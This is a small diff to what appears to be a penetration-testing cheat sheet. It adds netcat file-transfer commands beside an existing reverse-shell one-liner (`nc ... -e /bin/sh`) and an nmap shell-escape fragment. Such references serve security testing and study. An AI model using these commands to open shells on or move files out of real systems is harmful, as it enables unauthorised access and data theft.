@@ -3,7 +3,7 @@
 
 https://wordlists.assetnote.io \
 https://github.com/danielmiessler/SecLists \
-https://github.com/xajkep/wordlists \
+https://github.com/xajkep/wordlists 
 
 <br />
 
@@ -166,6 +166,9 @@ nmap: !sh
 ## Netcat
 Reverse shell:
 `nc 172.16.1.100 443 -e /bin/sh`
+Sendinf file:
+`nc -l -p 443 > out.file`
+`nc -w 3 10.0.0.1 443 < in.file` 
 
 ## Netcat without Netcat
 ```
